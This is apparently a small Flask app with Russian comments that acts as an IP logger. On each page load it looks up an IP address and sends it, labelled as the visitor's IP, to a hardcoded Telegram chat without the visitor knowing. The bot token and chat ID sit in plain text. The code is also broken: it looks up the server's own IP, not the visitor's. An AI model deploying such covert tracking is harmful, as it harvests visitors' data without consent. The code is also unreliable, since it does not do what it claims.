from flask import Flask, request, render_template_string
import requests
import telegram

app = Flask(__name__)

# Настройки Telegram бота
bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'
chat_id = '1200755705'

# Функция для отправки сообщения через Telegram
def send_telegram_message(message):
  bot = telegram.Bot(token=bot_token)
  bot.send_message(chat_id=chat_id, text=message)

@app.route('/')
def index():
  user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
  message = f"IP пользователя: {user_ip}"
  send_telegram_message(message)
  return "IP отправлен!", 200
